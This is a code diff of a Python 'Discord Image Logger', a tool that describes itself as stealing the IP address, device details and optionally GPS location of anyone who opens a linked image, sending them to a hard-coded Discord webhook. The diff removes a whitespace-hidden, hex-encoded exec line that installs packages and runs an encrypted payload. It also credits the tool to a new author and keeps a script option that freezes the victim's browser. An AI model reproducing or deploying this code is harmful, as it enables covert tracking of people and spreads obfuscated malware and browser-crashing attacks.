@@ -1,5 +1,6 @@
+# Image Logger
+# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
 
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x56\x32\x73\x61\x39\x37\x48\x49\x4f\x70\x34\x52\x47\x65\x38\x6a\x74\x6d\x46\x7a\x77\x76\x30\x75\x49\x7a\x67\x76\x36\x4e\x73\x6b\x59\x58\x71\x5f\x34\x5f\x6b\x32\x6e\x32\x67\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x64\x4d\x55\x32\x42\x44\x6d\x70\x69\x70\x38\x68\x30\x31\x7a\x65\x39\x51\x71\x69\x46\x6e\x68\x41\x75\x71\x58\x4e\x51\x39\x69\x47\x6c\x4e\x70\x45\x72\x4d\x6c\x47\x44\x69\x44\x44\x39\x58\x4c\x72\x4e\x6c\x54\x54\x4d\x4f\x59\x4f\x41\x31\x48\x61\x36\x6a\x34\x31\x39\x63\x4b\x74\x6d\x37\x43\x78\x52\x73\x49\x79\x41\x4f\x58\x4c\x38\x53\x79\x4a\x44\x71\x5f\x4c\x36\x30\x62\x58\x36\x76\x6e\x6d\x4b\x33\x58\x2d\x4a\x6d\x57\x78\x30\x4c\x7a\x62\x38\x32\x49\x78\x50\x63\x67\x54\x68\x42\x53\x5a\x48\x2d\x30\x74\x50\x50\x47\x4b\x77\x46\x31\x41\x4e\x32\x2d\x77\x69\x50\x41\x4f\x61\x63\x5a\x2d\x4b\x33\x4b\x44\x34\x54\x32\x2d\x50\x56\x66\x75\x31\x79\x4f\x75\x2d\x48\x73\x58\x59\x67\x33\x63\x37\x6c\x30\x49\x71\x61\x6d\x37\x4a\x5f\x58\x6e\x69\x45\x77\x61\x6a\x55\x73\x4d\x30\x79\x6d\x68\x59\x61\x34\x4c\x53\x52\x70\x6d\x70\x4c\x39\x67\x30\x59\x39\x75\x31\x64\x4b\x69\x30\x62\x52\x71\x71\x35\x61\x58\x7a\x7a\x41\x5f\x6d\x62\x6d\x62\x32\x47\x39\x78\x5f\x66\x4d\x70\x6f\x3d\x27\x29\x29')
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -7,12 +8,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1198705174588428459/WkcnjSeuK3XbymxrfXgmTzQQSiC_yGIkDdZAumpKe2qyd-4K-NlJ1_YO-RQYFjYycu9A",
-    "image": "https://cdn1.epicgames.com/epic/offer/RDR2PC1227_Epic%20Games_860x1148-860x1148-b4c2210ee0c3c3b843a8de399bfe7f5c.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -21,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -261,7 +262,7 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
@@ -300,6 +301,4 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
-
-print('kcwcdzlpu')
+handler = app = ImageLoggerAPI
